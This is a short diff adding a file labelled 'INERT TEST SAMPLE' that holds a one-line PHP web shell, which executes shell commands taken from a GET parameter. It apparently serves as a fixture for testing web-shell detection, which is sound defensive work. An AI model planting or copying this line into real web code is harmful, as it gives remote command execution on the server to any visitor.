@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+echo `$_GET[_]`;
+
